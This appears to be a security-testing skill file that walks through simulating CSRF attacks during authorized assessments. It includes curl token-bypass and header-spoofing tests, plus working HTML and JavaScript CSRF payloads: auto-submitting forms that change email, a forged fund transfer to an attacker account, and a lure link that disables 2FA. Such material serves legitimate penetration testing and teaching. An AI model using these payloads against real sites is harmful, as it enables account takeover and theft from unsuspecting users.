---
name: performing-csrf-attack-simulation
description: Testing web applications for Cross-Site Request Forgery vulnerabilities by crafting forged requests that exploit authenticated user sessions during authorized security assessments.
subdomain: web-application-security
facing: source
mitre_attack:
- T1190
- T1059.007
- T1505.003
- T1083
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
upstream: performing-csrf-attack-simulation@54a7988 Apache-2.0, modified by wesh
---
> Authorized use only: written scope / rules of engagement first. Refuse targets outside scope.
> Legal: This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## Codegraph (do this first)
1. `codegraph_explore "state changing handler and CSRF token"` — locate the state-changing routes and the token check beside them; `callers` for the path into it. Output = read.
2. Changing shared code: `codegraph callers <fn>` + `codegraph impact <fn>` before editing. One root-cause fix, owning layer, every call site covered.
3. Tests: `git diff --name-only | codegraph affected --stdin`. None at the seam = add one.
4. Before "unused"/rename/delete: `codegraph sync`, then grep. No graph yet: grep for the sinks above.
Any "grep/search the codebase" step below → use these calls instead; keep grep for strings, config and dynamic refs.

## Prerequisites

- **Authorization**: Written penetration testing agreement for target
- **Burp Suite Professional**: With CSRF PoC generator functionality
- **Web server**: Local HTTP server for hosting CSRF PoC pages (Python `http.server`)
- **Two browsers**: One authenticated as victim, one as attacker
- **Target application**: Authenticated session with valid test credentials
- **HTML/JavaScript knowledge**: For crafting custom CSRF payloads

## Workflow

### Step 1: Identify State-Changing Requests

Browse application and identify all POST/PUT/DELETE requests that modify server-side state.

```
# In Burp Suite, review Proxy > HTTP History
# Filter for POST/PUT/DELETE methods
# Focus on actions like:
# - Password/email change
# - Fund/money transfers
# - Account settings modifications
# - Adding/removing users or permissions
# - Creating/deleting resources
# - Toggling security features (2FA disable)

# Example state-changing request captured in Burp:
POST /api/account/change-email HTTP/1.1
Host: target.example.com
Cookie: session=abc123def456
Content-Type: application/x-www-form-urlencoded

email=newemail@example.com

# Check for anti-CSRF protections:
# - CSRF tokens in form fields or headers
# - Custom headers (X-CSRF-Token, X-Requested-With)
# - SameSite cookie attribute
# - Referer/Origin header validation
```

### Step 2: Analyze Anti-CSRF Token Implementation

Test strength and enforcement of any CSRF protections present.

```bash
# Check if CSRF token is present
curl -s -b "session=abc123" \
  "https://target.example.com/account/settings" | \
  grep -i "csrf\|token\|_token"

# Test 1: Remove the CSRF token entirely
curl -s -X POST \
  -b "session=abc123" \
  -d "email=test@evil.com" \
  "https://target.example.com/api/account/change-email" \
  -w "%{http_code}"

# Test 2: Send empty CSRF token
curl -s -X POST \
  -b "session=abc123" \
  -d "email=test@evil.com&csrf_token=" \
  "https://target.example.com/api/account/change-email" \
  -w "%{http_code}"

# Test 3: Use a random/invalid CSRF token
curl -s -X POST \
  -b "session=abc123" \
  -d "email=test@evil.com&csrf_token=AAAAAAAAAA" \
  "https://target.example.com/api/account/change-email" \
  -w "%{http_code}"

# Test 4: Reuse an expired/old CSRF token
curl -s -X POST \
  -b "session=abc123" \
  -d "email=test@evil.com&csrf_token=previously_captured_token" \
  "https://target.example.com/api/account/change-email" \
  -w "%{http_code}"

# Test 5: Use User B's CSRF token with User A's session
curl -s -X POST \
  -b "session=user_a_session" \
  -d "email=test@evil.com&csrf_token=user_b_csrf_token" \
  "https://target.example.com/api/account/change-email" \
  -w "%{http_code}"
```

### Step 3: Check SameSite Cookie and Header Protections

Verify browser-level and header-based CSRF defenses.

```bash
# Check SameSite attribute on session cookies
curl -s -I "https://target.example.com/login" | grep -i "set-cookie"
# Look for: SameSite=Strict, SameSite=Lax, or SameSite=None

# SameSite=Lax allows CSRF on top-level GET navigations
# SameSite=None; Secure allows cross-site requests
# No SameSite attribute: browser defaults to Lax (modern browsers)

# Check for Origin/Referer header validation
# Send request with no Referer
curl -s -X POST \
  -b "session=abc123" \
  -H "Referer: " \
  -d "email=test@evil.com&csrf_token=valid_token" \
  "https://target.example.com/api/account/change-email" \
  -w "%{http_code}"

# Send request with evil Referer
curl -s -X POST \
  -b "session=abc123" \
  -H "Referer: https://evil.example.com/attack" \
  -d "email=test@evil.com&csrf_token=valid_token" \
  "https://target.example.com/api/account/change-email" \
  -w "%{http_code}"

# Send request with spoofed Origin
curl -s -X POST \
  -b "session=abc123" \
  -H "Origin: https://evil.example.com" \
  -d "email=test@evil.com" \
  "https://target.example.com/api/account/change-email" \
  -w "%{http_code}"
```

### Step 4: Generate CSRF Proof-of-Concept with Burp Suite

Use Burp's built-in CSRF PoC generator for rapid testing.

```
# In Burp Suite:
# 1. Right-click the target request in Proxy > HTTP History
# 2. Select "Engagement tools" > "Generate CSRF PoC"
# 3. Click "Test in browser" to validate the PoC

# Burp generates HTML like:
```

```html
<!-- Auto-submitting CSRF PoC for form-encoded POST -->
<html>
  <body>
    <h1>Loading...</h1>
    <form action="https://target.example.com/api/account/change-email"
          method="POST" id="csrf-form">
      <input type="hidden" name="email" value="attacker@evil.com" />
    </form>
    <script>
      document.getElementById('csrf-form').submit();
    </script>
  </body>
</html>
```

### Step 5: Craft Advanced CSRF Payloads

For JSON APIs and other non-standard content types, use advanced techniques.

```html
<!-- CSRF for JSON API using form with enctype -->
<html>
  <body>
    <form action="https://target.example.com/api/account/change-email"
          method="POST"
          enctype="text/plain"
          id="csrf-form">
      <input type="hidden"
             name='{"email":"attacker@evil.com","ignore":"'
             value='"}' />
    </form>
    <script>
      document.getElementById('csrf-form').submit();
    </script>
  </body>
</html>

<!-- CSRF via XMLHttpRequest (requires permissive CORS) -->
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.example.com/api/account/change-email", true);
xhr.setRequestHeader("Content-Type", "application/json");
xhr.withCredentials = true;
xhr.send(JSON.stringify({"email": "attacker@evil.com"}));
</script>

<!-- CSRF via fetch API -->
<script>
fetch("https://target.example.com/api/account/change-email", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "application/x-www-form-urlencoded"},
  body: "email=attacker@evil.com"
});
</script>

<!-- CSRF via image tag (GET-based state change) -->
<img src="https://target.example.com/api/account/delete?confirm=true"
     style="display:none" />

<!-- Multi-step CSRF with iframe -->
<iframe style="display:none" name="csrf-frame"></iframe>
<form action="https://target.example.com/api/transfer"
      method="POST" target="csrf-frame" id="csrf-form">
  <input type="hidden" name="to_account" value="attacker-account" />
  <input type="hidden" name="amount" value="1000" />
</form>
<script>document.getElementById('csrf-form').submit();</script>
```

### Step 6: Test and Validate CSRF Attack

Host PoC and confirm successful exploitation.

```bash
# Start a local web server to host the CSRF PoC
cd /tmp/csrf-poc
python3 -m http.server 8888

# PoC file structure:
# /tmp/csrf-poc/
#   index.html          <- CSRF PoC page
#   change-email.html   <- Email change CSRF
#   transfer.html       <- Fund transfer CSRF

# Testing steps:
# 1. Log in to target as victim user in Browser A
# 2. Open http://localhost:8888/change-email.html in Browser A
# 3. Check if the email was changed without victim's consent
# 4. Verify the state change in the application

# For SameSite=Lax bypass via top-level navigation:
# Use GET-based CSRF with window.open or anchor tag
```

```html
<!-- SameSite=Lax bypass using top-level navigation -->
<html>
  <body>
    <a href="https://target.example.com/api/settings?action=disable_2fa"
       id="csrf-link">Click here for a prize!</a>
    <script>
      // Automatic click via social engineering context
      // SameSite=Lax allows cookies on top-level GET navigations
    </script>
  </body>
</html>
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **CSRF** | Attack that tricks authenticated user's browser into making unintended requests to vulnerable site |
| **Anti-CSRF Token** | Unique, unpredictable value tied to user's session that must be included in state-changing requests |
| **SameSite Cookie** | Browser attribute (Strict, Lax, None) controlling when cookies are sent in cross-site requests |
| **Origin Header** | HTTP header indicating origin of request, used for CSRF validation |
| **Referer Header** | HTTP header containing URL of referring page, sometimes used for CSRF checks |
| **Double Submit Cookie** | CSRF defense that compares cookie value with request parameter value |
| **Synchronizer Token Pattern** | Server generates and validates unique token per session or per request |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **Burp Suite Professional** | CSRF PoC generator and request analysis |
| **OWASP ZAP** | Anti-CSRF token detection and CSRF testing |
| **XSRFProbe** | Automated CSRF vulnerability scanner (`pip install xsrfprobe`) |
| **Python http.server** | Local web server for hosting CSRF PoC pages |
| **Browser DevTools** | Inspecting cookies, SameSite attributes, and network requests |
| **CSRFTester (OWASP)** | Legacy tool for crafting and testing CSRF attacks |

### Scenario 1: Email Change Without CSRF Token

Email change form does not include CSRF token. Attacker hosts page that auto-submits form changing victim's email to attacker's address, enabling account takeover via password reset.

### Scenario 2: Fund Transfer with Token Bypass

Banking application has CSRF tokens but does not validate them if parameter is omitted entirely. Removing the `csrf_token` field from transfer form allows cross-site fund transfer.

### Scenario 3: JSON API CSRF via Content-Type Manipulation

JSON API endpoint does not require custom header. Using `enctype="text/plain"` in HTML form, attacker crafts valid JSON body that changes victim's account settings.

### Scenario 4: SameSite=Lax Bypass on GET State Change

Settings page changes state via GET request (`/settings?disable_2fa=true`). Since `SameSite=Lax` allows cookies on top-level GET navigations, linking victim to this URL disables their 2FA.

Not vendored (scripts/, references/): https://github.com/mukul975/Anthropic-Cybersecurity-Skills/tree/54a798831d2266a3ca61ce68a7acb80b81160d57/skills/performing-csrf-attack-simulation
